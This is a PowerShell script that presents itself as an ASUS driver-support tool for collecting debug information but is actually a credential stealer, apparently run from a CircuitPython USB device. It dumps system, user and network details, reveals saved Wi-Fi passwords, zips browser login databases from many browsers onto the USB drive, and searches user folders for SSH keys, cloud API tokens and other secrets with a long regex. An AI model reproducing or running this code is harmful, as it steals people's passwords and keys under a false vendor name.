Write-Output "ASUS Driver & Firmware Support - Collecting Debug Information"
Write-Output ("_-" * 50)
Write-Output "Systeminfo"
Write-Output ("-" * 100)
systeminfo
Write-Output "Tasklist"
Write-Output ("-" * 100)
tasklist
Get-Process -IncludeUserName
Write-Output "netstat"
Write-Output ("-" * 100)
netstat -ano
Write-Output "Userinfo"
Write-Output ("-" * 100)
whoami /all
whoami /priv
Write-Output "net user"
Write-Output ("-" * 100)
net user
Write-Output "net localgroup"
Write-Output ("-" * 100)
net localgroup
Write-Output "Get-NetAdapter"
Write-Output ("-" * 100)
Get-NetAdapter
Write-Output "ipconfig /all"
Write-Output ("-" * 100)
ipconfig /all
Write-Output "ipconfig /displaydns"
Write-Output ("-" * 100)
ipconfig /displaydns
Write-Output "route print"
Write-Output ("-" * 100)
route print
Write-Output "ARP-Table"
Write-Output ("-" * 100)
arp -a
Write-Output "net share"
Write-Output ("-" * 100)
net share
Write-Output "Installed Software"
Write-Output ("-" * 100)
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall" /s
Write-Output "Autorun"
Write-Output ("-" * 100)
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /s
Write-Output "Get-PSDrive -PSProvider FileSystem"
Write-Output ("-" * 100)
Get-PSDrive -PSProvider FileSystem
Write-Output "query user"
Write-Output ("-" * 100)
query user
Write-Output "Get-ChildItem Env:"
Write-Output ("-" * 100)
Get-ChildItem Env:
Write-Output "bcdedit"
Write-Output ("-" * 100)
bcdedit
Write-Output "User Dir"
Write-Output ("-" * 100)
Get-ChildItem
Write-Output ("-" * 100)
# Finished Basic Info, trying to go deeper now...
Write-Output "Get-ScheduledTask"
Write-Output ("-" * 100)
Get-ScheduledTask
Write-Output "Get-WmiObject"
Write-Output ("-" * 100)
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter
Write-Output "Wifi Infos"
Write-Output ("-" * 100)
try { $wlansvcStatus = Get-Service -Name WlanSvc -ErrorAction SilentlyContinue;  if ($wlansvcStatus.Status -eq 'Running') { $profiles = netsh wlan show profiles | Select-String ":(.*)" | ForEach-Object { ($_ -split ":")[1].Trim() }  if ($profiles.Count -eq 0) { Write-Output "[-] No Wi-Fi profiles found"; return }; foreach ($profile in $profiles) { netsh wlan show profile name="$profile" key=clear } } } catch { Write-Output "[-] Error Wi-Fi : $_" }
Write-Output "Get-WmiObject Win32_COMClass"
Write-Output ("-" * 100)
Get-WmiObject -Query "SELECT * FROM Win32_COMClass"
Write-Output "Get-WmiObject Win32_EncryptableVolume"
Write-Output ("-" * 100)
Get-WmiObject -List | Where-Object { $_.Name -eq "Win32_EncryptableVolume" }
Write-Output "Looking for Certificate Authorities..."
Write-Output ("-" * 100)
cmdkey /list;
$deloid = ((Get-Volume | Where-Object { $_.FileSystemLabel -eq "CIRCUITPY" }).DriveLetter + ":") -replace "^:$", "F:"
$db1 = @( "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data", "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data", "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Login Data", "$env:USERPROFILE\AppData\Roaming\Opera Software\Opera Stable\Login Data", "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json", "$env:USERPROFILE\AppData\Local\Microsoft\Windows\INet Login", "$env:USERPROFILE\AppData\Local\Vivaldi\User Data\Default\Login Data", "$env:USERPROFILE\AppData\Local\Yandex\YandexBrowser\User Data\Default\Login Data", "$env:APPDATA\Waterfox\Profiles\*.default\logins.json", "$env:APPDATA\Pale Moon\Profiles\*.default\logins.json" )
$tBm = 0;
foreach ($dbP in $db1) { try { $dbPaths = Get-ChildItem -Path "$dbP" -ErrorAction SilentlyContinue } catch { Write-Output "[-dbP-]" } foreach ($dbPath in $dbPaths) { try { $path = $dbPath.FullName; if (((Get-Acl "$path").Access.IdentityReference -match "$env:USERDOMAIN\\$env:USERNAME") -or ((Get-Acl "$path").Owner -match "$env:USERDOMAIN\\$env:USERNAME")) { $content = Get-Content -Path $dbPath.FullName -ErrorAction Stop -Raw; if ($content -match "username|password") { $tBm++;  Write-Output "[+] Browser Creds: $($dbPath.FullName)"; Compress-Archive -Path $($dbPath.FullName) -DestinationPath "$deloid/sd/$(Split-Path -Leaf $dbPath.FullName)_$(Get-Random).zip"; } } } catch { Write-Output "[-bcc-]" } } };
$dTs = @("$env:USERPROFILE", "$env:PATH");  
$xcldFoD = 'cache|node_modules|bower_components|lib|site-packages|dist-packages|vendor|packages|nuget|elasticsearch|maven|gradle|lib|pycache|venv|localization|jdk|native|steamapps|resources|thunderbird|outlook|jquery|miniconda|pkgs|micropython|circuitpython'
$sigFlN = "otr.private_key", "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", "id_rsa.pub", "id_dsa.pub", "id_ecdsa.pub", "id_ed25519.pub", "id_rsa_old", "id_rsa_backup", "id_ecdsa_old", "id_ed25519_backup", "id_rsa_temp", "id_dsa_temp", "ssh_key", "ssh_key.pub", "secret_token.rb", "carrierwave.rb", "database.yml", "omniauth.rb", "settings.py", "jenkins.plugins.publish_over_ssh.BapSshPublisherPlugin.xml", "credentials.xml", "LocalSettings.php", "Favorites.plist", "configuration.user.xpl", "journal.txt", "knife.rb", "proftpdpasswd", "robomongo.json", "*.rsa", "*.dsa", "*.ed25519", "*.ecdsa", "*.history", "*.mysql_history", "*.psql_history", "*.pgpass", "*.irb_history", "*.dbeaver-data-sources.xml", "*.muttrc", "*.s3cfg", "sftp-config.json", "*.trc", "config*.php", "*.htpasswd", "*.tugboat", "*.git-credentials", "*.gitconfig", "*.env", "heroku.json", "dump.sql", "id_rsa_pub", ".remote-sync.json", ".esmtprc", "deployment-config.json", ".ftpconfig"
$sigExt ="*.php", "*.txt", "*.docx", "*.ini", "*.md", "*.rtf", "*.csv", "*.xml", "*.one", "*.dcn", "*.env", "*.mailmap", "*.config", "*.yaml", "*.yml", "*.json", "*.properties", "*.plist", "*.sh", "*.ps1", "*.py", "*.rb", "*.js", "*.bash", "*.password", "*.key", "*.pem", "*.log", "*.pkcs12", "*.p12", "*.pfx", "*.asc", "*.ovpn", "*.id_rsa", "*.id_dsa", "*.id_ecdsa", "*.id_ed25519", "*.id_rsa.pub", "*.id_dsa.pub", "*.id_ecdsa.pub", "*.id_ed25519.pub", "*.id_rsa_old", "*.id_rsa_backup", "*.id_ecdsa_old", "*.id_ed25519_backup", "*.id_rsa_temp", "*.id_dsa_temp", "*.ssh_key", "*.ssh_key.pub", "*.cscfg", "*.rdp", "*.mdf", "*.sdf", "*.sqlite", "*.sqlite3", "*.bek", "*.tpm", "*.fve", "*.jks", "*.psafe3", "*.agilekeychain", "*.keychain", "*.pcap", "*.gnucash", "*.kwallet", "*.tblk", "*.dayone", "*.keypair", "*.keystore", "*.keyring", "*.sql", "*.ppk", "*.sqldump"
$exclEt = @('*.exe', '*.jpg', '*.jpeg', '*.png', '*.gif', '*.bmp', '*.tiff', '*.tif', '*.zip', '*.gz', '*.lock'); 
$rgPath = "c:\windows\temp\rg.exe"
$combinedPattern = @'
-----BEGIN.*KEY-----[\s\S]*?-----END.*KEY-----|A3T[A-Z0-9]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA[A-Z0-9]{16}|aws_(access_key_id|secret_access_key|session_token|account_id)\s*[:=|=>]\s*[A3T|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA][A-Z0-9]{16}|aws_secret_access_key\s*[:=|=>]\s*[A-Za-z0-9/+=]{40}|aws_session_token\s*[:=|=>]\s*[A-Za-z0-9/+=]{16,}|artifactory.{0,50}[0-9a-f]{112}|codeclima.{0,50}[0-9a-f]{64}|EAACEdEose0cBA[0-9A-Za-z]+|type\s*[:=|=>]\s*service_account|rk_[live|test]_[0-9a-zA-Z]{24}|[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com|AIza[0-9A-Za-z\\-_]{35}|ya29\\.[0-9A-Za-z\\-_]+|sk_[live|test]_[0-9a-z]{32}|sq0atp-[0-9A-Za-z\\-_]{22}|sq0csp-[0-9A-Za-z\\-_]{43}|access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}|amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}|SK[0-9a-fA-F]{32}|SG\.[0-9A-Za-z\\-_]{22}\.[0-9A-Za-z\\-_]{43}|key-[0-9a-zA-Z]{32}|[0-9a-f]{32}-us[0-9]{12}|sshpass -p.*['`"]|https://outlook\.office\.com/webhook/[0-9a-f-]{36}\\@|sauce.{0,50}[0-9a-f]{36}|xox[pboa]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32}|https://hooks.slack.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}|sonar.{0,50}[0-9a-f]{40}|hockey.{0,50}[0-9a-f]{32}|[\w+]{1,24}://([^$<]+):([^$<]+)@[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,24}([^\s]+)|oy2[0-9]{43}|hawk\.[0-9A-Za-z\-_]{20}\.[0-9A-Za-z\-_]{20}|define(.{0,20})?(DB_CHARSET|NONCE_SALT|LOGGED_IN_SALT|AUTH_SALT|NONCE_KEY|DB_HOST|DB_PASSWORD|AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|DB_NAME|DB_USER)(.{0,20})?['"]{10,120}|facebook.{0,20}[0-9a-f]{32}|facebook.{0,20}EAACEdEose0cBA|facebook.{0,20}[0-9a-zA-Z]{10,60}|twitter.{0,20}[A-Za-z0-9_]{15,50}|mYCLp[0-9]{4}-[A-Z]{2}|(user(?:name)?|password?|pwd?)\s*[:=]|login\s.*credentials|key\w*\s*[:=]|token(?:_?\w+)?\s*[:=]|securestring\s*[:=]|admin\s*[:=]|root\s*[:=]|[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|access_token\s*[:=]|api_key\s*[:=]|session_id\s*[:=]|ssh\s+\S+@\S+
'@
$excludeDirs = "--glob=!$($xcldFoD -replace '\|', ' --glob=!*/')"
$globIncludes = @($sigFlN).ForEach({ $_ -replace '\*', '' }) + ($sigExt | ForEach-Object { if ($_ -match '.*\*.*') { "--glob=$_" } else { "--glob=$($_)" } }) -join ' '
$globExcludes = ($exclEt | ForEach-Object { "--glob=!$_" }) -join " "
$globExcludes += " " + $excludeDirs
$fileList = @(); $unDup = @{}
foreach ($dir in $dTs) { $resolvedDir = (Resolve-Path -Path "$dir" -ErrorAction SilentlyContinue).Path; if (-not $resolvedDir -or $resolvedDir -match $xcldFoD) { continue };  $cmdArgs = "--files " + $globIncludes + " " + $globExcludes + " " + $resolvedDir; $fileList += & $rgPath @($cmdArgs.Split(' ')) 2>$null; };
$fileList | Where-Object { -not ($_ -imatch $xcldFoD) } | ForEach-Object { $unDup[$_] = $null }
try { $cores = (Get-CimInstance Win32_Processor).NumberOfCores * 2 } catch { $cores = 8 };
foreach ($file in $unDup.Keys) { if ((Get-Item $file).Length / 1KB -gt 100) { continue }; Write-Output ("-" * 100); $file; & $rgPath -uu -U -j "$cores" --max-columns 8192 --regex-size-limit 1000000 --max-filesize=1M --max-depth 1 --pcre2 -- $combinedPattern $file; }
Write-Output "Finished collecting ASUS Debug Info, uploading..."
